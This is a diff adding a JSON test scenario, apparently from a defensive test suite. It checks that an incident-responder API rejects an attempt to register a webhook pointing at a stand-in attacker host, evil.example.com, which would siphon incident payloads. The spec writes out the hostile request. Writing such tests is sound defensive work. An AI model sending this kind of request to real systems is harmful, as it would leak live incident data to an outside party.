@@ -1,0 +1,20 @@
+{
+  "id": "02_exfil",
+  "title": "Webhook data exfiltration via incident responder",
+  "description": "Adversary attempts to register a webhook to siphon live incident payloads from the responder integration.",
+  "tags": ["data-exfiltration", "webhook"],
+  "executor": "api",
+  "spec": "POST /integrations/webhooks {\n  \"url\": \"https://evil.example.com/callback\",\n  \"events\": [\"incident.created\"]\n}",
+  "checks": [
+    {
+      "type": "status_equals",
+      "field": "status",
+      "equals": 409
+    },
+    {
+      "type": "contains",
+      "field": "text",
+      "value": "replay detected"
+    }
+  ]
+}
